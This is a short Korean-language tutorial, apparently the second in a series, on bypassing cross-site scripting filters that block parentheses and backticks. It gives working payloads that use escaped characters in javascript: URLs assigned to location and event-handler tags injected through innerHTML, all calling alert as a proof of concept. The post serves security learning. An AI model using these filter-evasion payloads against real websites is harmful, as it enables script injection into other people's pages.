1편을 보고오시면 더 이해가 잘됩니다.
![아아아](https://kr.object.ncloudstorage.com/dreamhack-content/page/d93ebd8d44183538e008843f2b814271ccc49795238660d115d82b335312954d.jpg)
# 개요
이번엔 함수 호출을 우회하는법에 대하여 알아보자
들어가기전에 앞서 JavaScript에서는 함수를 호출하는 방법이 크게 2개있는데 Parentheses방법과 Tagged Templates방법이 있다
``` JS
alert(1); // Parentheses
alert`1`; // Tagged Templates
```
**하지만** 괄호와 백틱이 필터링된다면 여러가지 방법으로 우회할 수 있습니다
# 1. javascript 스키마를 이용한 location 변경
javascript: 스키마를 이용하면 URL창에 입력된 값으로 자바스크립트 코드를 실행할 수 있다. 이를 이용해 location를 바꾸어 우회할 수 있다.
``` JS
location="javascript:alert\x28document.domain\x29;";
location.href="javascript:alert\u0028document.domain\u0029;";
location['href']="javascript:alert\050document.domain\051;";
```
# 2.document.body.innerHTML 추가
자바스크립트에는 문서 내에 새로운 HTML 코드를 추가할 수 있다.
하지만 이런식으로 코드를 삽입하면 script 태그가 작동하지 않기때문에 이벤트 핸들러를 이용해야한다
``` JS
document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
```

